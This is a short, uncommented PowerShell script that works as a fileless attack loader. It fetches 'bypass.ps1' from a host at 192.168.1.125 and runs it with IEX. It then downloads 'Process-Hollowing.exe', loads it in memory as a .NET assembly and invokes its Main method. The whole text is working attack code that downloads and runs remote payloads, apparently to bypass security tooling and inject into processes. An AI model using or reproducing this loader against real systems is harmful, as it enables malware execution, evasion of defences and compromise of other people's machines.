$wr = [System.NET.webRequest]::Create('http://192.168.1.125/bypass.ps1')
$r = $wr.GetResponse()
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
$bytes = (Invoke-WebRequest "http://192.168.1.125/Process-Hollowing.exe").Content;
$assembly = [System.Reflection.Assembly]::Load($bytes);
$entryPointMethod = $assembly.GetType('Process_Hollowing.Program', [Reflection.BindingFlags] 'Public, NonPublic').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic');
$entryPointMethod.Invoke($null, (, [string[]] ('', '')));